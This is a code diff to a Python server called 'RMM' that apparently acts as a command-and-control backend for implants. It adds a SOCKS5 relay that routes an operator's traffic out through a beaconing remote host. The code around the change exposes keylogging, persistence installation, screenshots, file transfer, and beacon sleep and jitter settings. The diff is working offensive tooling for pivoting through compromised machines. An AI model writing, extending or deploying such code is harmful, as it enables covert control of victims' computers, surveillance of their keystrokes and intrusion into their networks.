@@ -39,6 +39,7 @@ except ImportError:
     _PTCompleterBase = object  # RMMPTKCompleter only used when prompt_toolkit is installed
 
 from rmm_ws import OperatorEventHub, WebSocketConnection
+from rmm_socks import DEFAULT_SOCKS_PORT, DEFAULT_BIND_HOST, SocksManager
 
 # History: GNU readline loads this in _run_cli_readline; prompt_toolkit FileHistory uses the same path in _run_cli_prompt_toolkit
 HISTORY_FILE = os.path.expanduser("~/.RMM_history")
@@ -204,7 +205,7 @@ class Completer:
         self.commands = [
             'list', 'use', 'info', 'background', 'kill',
             'set_sleep', 'set_jitter', 'show_config',
-            'download', 'upload', 'screenshot',
+            'download', 'upload', 'screenshot', 'socks',
             'keylog', 'persist', 'stop',
             'install_persist', 'remove_persist',
             'help', 'clear', 'quit', 'exit',
@@ -386,6 +387,7 @@ class RMMServer:
         self.current_session = None
         self.running = True
         self.event_hub = OperatorEventHub()
+        self.socks = SocksManager(log_fn=self.log)
 
     @staticmethod
     def _format_ago(seconds):
@@ -525,7 +527,29 @@ class RMMServer:
             if self.current_session == session.id:
                 self.current_session = None
         self.event_hub.broadcast_sessions(self.sessions_to_json())
+        self.socks.stop(session.id)
         return True, session.id
+
+    def start_socks(self, session_id: str, port: int = DEFAULT_SOCKS_PORT, bind_host: str = DEFAULT_BIND_HOST) -> bool:
+        session = self.get_session(session_id)
+        if not session:
+            return False
+        try:
+            self.socks.start(session_id, port=port, bind_host=bind_host)
+        except OSError as e:
+            self.log(f"SOCKS failed to bind {bind_host}:{port}: {e}", "ERROR")
+            return False
+        self.set_command(session_id, "__SOCKS_START__", "oneshot")
+        self.record_operator_action(session, f"socks {port}", "socks")
+        return True
+
+    def stop_socks(self, session_id: str) -> bool:
+        stopped = self.socks.stop(session_id)
+        session = self.get_session(session_id)
+        if session:
+            self.set_command(session_id, "__SOCKS_STOP__", "oneshot")
+            self.record_operator_action(session, "socks stop", "socks")
+        return stopped
 
     def exec_and_wait(self, session_id_or_prefix, command, timeout=120):
         session = self.resolve_session(session_id_or_prefix)
@@ -1106,6 +1130,34 @@ class RMMHandler(BaseHTTPRequestHandler):
             self._json(200, {"ok": True, "session_id": session.id, "queued": "__SCREENSHOT__"})
             return True
 
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "socks":
+            session = srv.resolve_session(parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            if body.get("stop"):
+                srv.stop_socks(session.id)
+                self._json(200, {"ok": True, "session_id": session.id, "stopped": True})
+                return True
+            port = int(body.get("port", DEFAULT_SOCKS_PORT))
+            if port < 1 or port > 65535:
+                self._json(400, {"error": "invalid_port"})
+                return True
+            bind_host = str(body.get("bind_host", DEFAULT_BIND_HOST))
+            if not srv.start_socks(session.id, port=port, bind_host=bind_host):
+                self._json(500, {"error": "socks_start_failed"})
+                return True
+            self._json(
+                200,
+                {
+                    "ok": True,
+                    "session_id": session.id,
+                    "socks_url": f"socks5://{bind_host}:{port}",
+                    "queued": "__SOCKS_START__",
+                },
+            )
+            return True
+
         if parts == ["ai", "chat"]:
             openai_key = (body.get("openai_api_key") or os.environ.get("OPENAI_API_KEY", "")).strip()
             if not openai_key:
@@ -1240,7 +1292,7 @@ class RMMHandler(BaseHTTPRequestHandler):
         if self._serve_web(path):
             return
         
-        if path in ("/register", "/cmd", "/ping"):
+        if path in ("/register", "/cmd", "/ping", "/socks"):
             if not self._beacon_authorized(qs):
                 self._beacon_forbidden()
                 return
@@ -1279,6 +1331,15 @@ class RMMHandler(BaseHTTPRequestHandler):
             else:
                 self.server_instance.touch_session(session_id)
                 self._respond(200, "PONG")
+
+        elif path == "/socks":
+            err, session_id = self._beacon_session_id_from_qs(qs)
+            if err:
+                self._respond(400, err)
+            else:
+                self.server_instance.touch_session(session_id)
+                tasks = self.server_instance.socks.poll_tasks(session_id)
+                self._respond(200, json.dumps({"tasks": tasks}), "application/json")
         
         else:
             self._respond(404, "Not Found")
@@ -1302,7 +1363,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             self._respond(404, "Not Found")
             return
 
-        if path == "/result":
+        if path in ("/result", "/socks"):
             if not self._beacon_authorized(qs):
                 self._beacon_forbidden()
                 return
@@ -1311,6 +1372,18 @@ class RMMHandler(BaseHTTPRequestHandler):
             except ValueError:
                 self._respond(413, "PAYLOAD TOO LARGE")
                 return
+
+        if path == "/socks":
+            err, session_id = self._beacon_session_id_from_qs(qs)
+            if err:
+                self._respond(400, err)
+                return
+            self.server_instance.touch_session(session_id)
+            if not self.server_instance.socks.post_responses(session_id, body):
+                self._respond(400, "INVALID SOCKS PAYLOAD")
+            else:
+                self._respond(200, "OK")
+            return
 
         if path == "/result":
             raw_id = qs.get("id", [None])[0]
@@ -1396,6 +1469,10 @@ class CommandInterface:
 {Colors.CYAN}File Operations:{Colors.END}
   {Colors.GREEN}download <file>{Colors.END}          - Download file from target
   {Colors.GREEN}upload <local> <remote>{Colors.END}  - Upload file to target
+
+{Colors.CYAN}Tunneling:{Colors.END}
+  {Colors.GREEN}socks [port]{Colors.END}           - SOCKS5 on 127.0.0.1 (default port {DEFAULT_SOCKS_PORT})
+  {Colors.GREEN}socks stop{Colors.END}             - Stop SOCKS relay for this session
 
 {Colors.CYAN}Reconnaissance:{Colors.END}
   {Colors.GREEN}screenshot{Colors.END}               - Capture screenshot
@@ -1625,6 +1702,32 @@ class CommandInterface:
             elif cmd == "remove_persist":
                 self.server.set_command(self.server.current_session, "__REMOVE_PERSIST__", "oneshot")
                 self.server.tty_print(f"{Colors.DIM}Removing persistence...{Colors.END}")
+
+            elif cmd == "socks":
+                if args and args[0].lower() == "stop":
+                    self.server.stop_socks(self.server.current_session)
+                    self.server.tty_print(f"{Colors.DIM}SOCKS relay stopped{Colors.END}")
+                else:
+                    port = DEFAULT_SOCKS_PORT
+                    if args:
+                        try:
+                            port = int(args[0])
+                            if port < 1 or port > 65535:
+                                raise ValueError
+                        except ValueError:
+                            self.server.tty_print(f"{Colors.RED}Invalid port (1-65535){Colors.END}")
+                            return True
+                    if self.server.start_socks(self.server.current_session, port):
+                        self.server.tty_print(
+                            f"{Colors.GREEN}SOCKS5 on {DEFAULT_BIND_HOST}:{port} — "
+                            f"point tools at socks5://127.0.0.1:{port}{Colors.END}"
+                        )
+                        self.server.tty_print(
+                            f"{Colors.DIM}Client must beacon; traffic exits the remote host. "
+                            f"Use 'socks stop' when done.{Colors.END}"
+                        )
+                    else:
+                        self.server.tty_print(f"{Colors.RED}Failed to start SOCKS (session or bind error){Colors.END}")
 
             else:
                 # Regular shell command
